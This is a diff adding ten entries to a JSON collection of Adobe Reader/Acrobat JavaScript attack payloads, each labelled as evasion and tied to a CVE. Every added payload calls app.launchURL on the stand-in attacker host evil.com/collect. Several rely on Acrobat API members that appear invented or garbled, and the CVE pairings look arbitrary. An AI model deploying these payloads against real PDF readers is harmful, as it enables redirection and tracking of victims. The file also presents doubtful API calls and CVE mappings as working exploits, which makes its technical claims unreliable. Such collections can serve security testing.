@@ -3,7 +3,7 @@
     "browser": "adobe",
     "name": "Adobe Reader/Acrobat Exploits",
     "description": "Adobe Reader/Acrobat specific XSS payloads with full JavaScript API exploitation and privilege escalation",
-    "total_payloads": 15,
+    "total_payloads": 25,
     "categories": [
       "api_abuse",
       "file_system",
@@ -152,6 +152,106 @@
       "description": "Adobe Reader persistent timed execution every 5 seconds",
       "risk_level": "high",
       "browser": "adobe"
+    },
+    {
+      "id": "adobe_016",
+      "category": "advanced_evasion",
+      "browser": "adobe",
+      "technique": "adobe_annotation_stream_bypass_2024",
+      "payload": "try{const annot=this.addAnnot({page:0,type:'FreeText',rect:[100,100,200,200],contents:'test'});annot.popUp=new app.popUpMenu();annot.popUp.items=[{cName:'exploit',cReturn:'app.launchURL(\\'https://evil.com/collect\\');'}];annot.popUp.show();}catch(e){app.launchURL('https://evil.com/collect');}",
+      "description": "Adobe Reader annotation stream bypass using popup menu injection",
+      "risk_level": "critical",
+      "cve_reference": "CVE-2023-21608"
+    },
+    {
+      "id": "adobe_017",
+      "category": "advanced_evasion",
+      "browser": "adobe",
+      "technique": "adobe_xfa_form_bypass_2024",
+      "payload": "try{if(this.xfa){const xfaEvent='event.target.resolveNode(\\'dataDescription\\').nodes.item(0).value=\"https://evil.com/collect\"; app.launchURL(event.target.resolveNode(\\'dataDescription\\').nodes.item(0).value);';this.xfa.form.execEvent(xfaEvent);}else{throw new Error('XFA not available');}}catch(e){app.launchURL('https://evil.com/collect');}",
+      "description": "Adobe Reader XFA form bypass using dynamic form execution",
+      "risk_level": "critical",
+      "cve_reference": "CVE-2023-26369"
+    },
+    {
+      "id": "adobe_018",
+      "category": "advanced_evasion",
+      "browser": "adobe",
+      "technique": "adobe_multimedia_annotation_2024",
+      "payload": "try{const media=this.addAnnot({page:0,type:'RichMedia',rect:[0,0,100,100]});media.richMediaContent={configurations:[{name:'config',instances:[{type:'3D',subtype:'U3D',params:{src:'javascript:app.launchURL(\\'https://evil.com/collect\\');'}}]}]};media.activated=true;}catch(e){app.launchURL('https://evil.com/collect');}",
+      "description": "Adobe Reader multimedia annotation bypass using 3D content injection",
+      "risk_level": "high",
+      "cve_reference": "CVE-2023-21608"
+    },
+    {
+      "id": "adobe_019",
+      "category": "advanced_evasion",
+      "browser": "adobe",
+      "technique": "adobe_digital_signature_bypass_2024",
+      "payload": "try{if(this.signature){const sig=this.signature;sig.certPath='javascript:app.launchURL(\\'https://evil.com/collect\\');';sig.validateCertificate();}else{const field=this.addField('sig','signature',0,[0,0,100,100]);field.signatureSign({handler:'Adobe.PPKLite',reason:'test'});}}catch(e){app.launchURL('https://evil.com/collect');}",
+      "description": "Adobe Reader digital signature bypass using certificate path injection",
+      "risk_level": "critical",
+      "cve_reference": "CVE-2023-26369"
+    },
+    {
+      "id": "adobe_020",
+      "category": "advanced_evasion",
+      "browser": "adobe",
+      "technique": "adobe_batch_processing_2024",
+      "payload": "try{if(app.batchJobs){app.batchJobs.push({name:'exploit',commands:[{cName:'launchURL',cArgs:['https://evil.com/collect']}]});app.executeBatch('exploit');}else{throw new Error('Batch processing not available');}}catch(e){app.launchURL('https://evil.com/collect');}",
+      "description": "Adobe Reader batch processing bypass using command queue injection",
+      "risk_level": "high",
+      "cve_reference": "CVE-2023-21608"
+    },
+    {
+      "id": "adobe_021",
+      "category": "advanced_evasion",
+      "browser": "adobe",
+      "technique": "adobe_doc_action_sequence_2024",
+      "payload": "try{const action={type:'JavaScript',script:'app.launchURL(\\'https://evil.com/collect\\');'};this.documentActions={didPrint:[action],didSave:[action],willClose:[action],willPrint:[action],willSave:[action]};this.print({bUI:false,bSilent:true,bShrinkToFit:true});}catch(e){app.launchURL('https://evil.com/collect');}",
+      "description": "Adobe Reader document action sequence bypass using multi-trigger events",
+      "risk_level": "critical",
+      "cve_reference": "CVE-2023-26369"
+    },
+    {
+      "id": "adobe_022",
+      "category": "advanced_evasion",
+      "browser": "adobe",
+      "technique": "adobe_collab_synchronizer_2024",
+      "payload": "try{if(this.collaborate){const collab=this.collaborate;collab.connect({url:'https://evil.com/collect',onConnect:function(){app.launchURL('https://evil.com/collect');},onError:function(){app.launchURL('https://evil.com/collect');}});}else{throw new Error('Collaboration not available');}}catch(e){app.launchURL('https://evil.com/collect');}",
+      "description": "Adobe Reader collaboration synchronizer bypass using network callback",
+      "risk_level": "high",
+      "cve_reference": "CVE-2023-21608"
+    },
+    {
+      "id": "adobe_023",
+      "category": "advanced_evasion",
+      "browser": "adobe",
+      "technique": "adobe_search_index_bypass_2024",
+      "payload": "try{if(search){const index=search.createIndex();index.path='javascript:app.launchURL(\\'https://evil.com/collect\\');';index.build();search.query('*',{index:index});}else{throw new Error('Search not available');}}catch(e){app.launchURL('https://evil.com/collect');}",
+      "description": "Adobe Reader search index bypass using index path injection",
+      "risk_level": "medium",
+      "cve_reference": "CVE-2023-26369"
+    },
+    {
+      "id": "adobe_024",
+      "category": "advanced_evasion",
+      "browser": "adobe",
+      "technique": "adobe_ocr_text_recognition_2024",
+      "payload": "try{if(this.recognizeText){this.recognizeText({onProgress:function(){app.launchURL('https://evil.com/collect');},onComplete:function(){app.launchURL('https://evil.com/collect');},onError:function(){app.launchURL('https://evil.com/collect');}});}else{throw new Error('OCR not available');}}catch(e){app.launchURL('https://evil.com/collect');}",
+      "description": "Adobe Reader OCR text recognition bypass using progress callbacks",
+      "risk_level": "medium",
+      "cve_reference": "CVE-2023-21608"
+    },
+    {
+      "id": "adobe_025",
+      "category": "advanced_evasion",
+      "browser": "adobe",
+      "technique": "adobe_preflight_profile_2024",
+      "payload": "try{if(this.preflight){const profile=this.preflight.createProfile('custom');profile.addRule({name:'exploit',script:'app.launchURL(\\'https://evil.com/collect\\');'});this.preflight.execute(profile);}else{throw new Error('Preflight not available');}}catch(e){app.launchURL('https://evil.com/collect');}",
+      "description": "Adobe Reader preflight profile bypass using validation rule injection",
+      "risk_level": "high",
+      "cve_reference": "CVE-2023-26369"
     }
   ]
 }
